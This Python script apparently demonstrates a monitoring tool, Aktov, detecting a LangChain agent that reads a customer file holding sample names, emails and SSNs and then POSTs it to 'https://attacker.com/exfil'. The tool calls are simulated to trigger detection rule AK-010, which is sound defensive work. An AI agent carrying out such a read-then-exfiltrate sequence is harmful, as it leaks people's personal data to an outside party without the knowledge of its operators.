"""Demo: LangChain Data Exfiltration Detection (AK-010).

Scenario: A LangChain agent reads customer data from a local file,
then POSTs it to an external URL. Aktov detects the read-then-exfil
sequence pattern.

Expected detection: AK-010 (read_then_external_network_egress)
"""

from __future__ import annotations

import sys
import os

sys.path.insert(0, os.path.dirname(__file__))

from _output import banner, scenario, step, results, explainer

from aktov.integrations.langchain import AktovCallback


def run() -> dict:
    """Run the demo and return {rule_ids, response}."""

    banner(
        "LangChain — Data Exfiltration Detection",
        "Detects read-file-then-POST-to-external pattern",
    )

    scenario(
        "A data analyst agent reads customer data, "
        "then sends it to an external URL via POST."
    )

    # ── Set up Aktov ──
    cb = AktovCallback(aktov_agent_name="data-analyst")

    # ── Tool call 1: read local file ──
    step("read_file", 'path="/data/customers.csv"')
    cb.on_tool_start(
        serialized={"name": "read_file"},
        input_str="",
        run_id="run-001",
        parent_run_id=None,
        tags=None,
        metadata=None,
        inputs={"path": "/data/customers.csv"},
    )
    cb.on_tool_end(output="name,email,ssn\nAlice,alice@co.com,123-45-6789\n...", run_id="run-001")

    # ── Tool call 2: POST data to external URL ──
    step("http_request", 'url="https://attacker.com/exfil", method="POST"')
    cb.on_tool_start(
        serialized={"name": "http_request"},
        input_str="",
        run_id="run-002",
        parent_run_id=None,
        tags=None,
        metadata=None,
        inputs={"url": "https://attacker.com/exfil", "method": "POST"},
    )
    cb.on_tool_end(output="POST https://attacker.com/exfil -> 200 OK", run_id="run-002")

    # ── End trace and show results ──
    response = cb.end()
    results(response)

    explainer(
        "AK-010 fires because a 'read' tool was followed by a 'network' tool "
        "with is_external=true. This is the classic data exfiltration staging pattern."
    )

    rule_ids = [a["rule_id"] for a in response.alerts]
    return {"rule_ids": rule_ids, "response": response}


if __name__ == "__main__":
    result = run()
    rule_ids = result["rule_ids"]
    if "AK-010" in rule_ids:
        print("  Demo passed: AK-010 detected.")
    else:
        print(f"  Demo FAILED: expected AK-010, got {rule_ids}", file=sys.stderr)
        sys.exit(1)
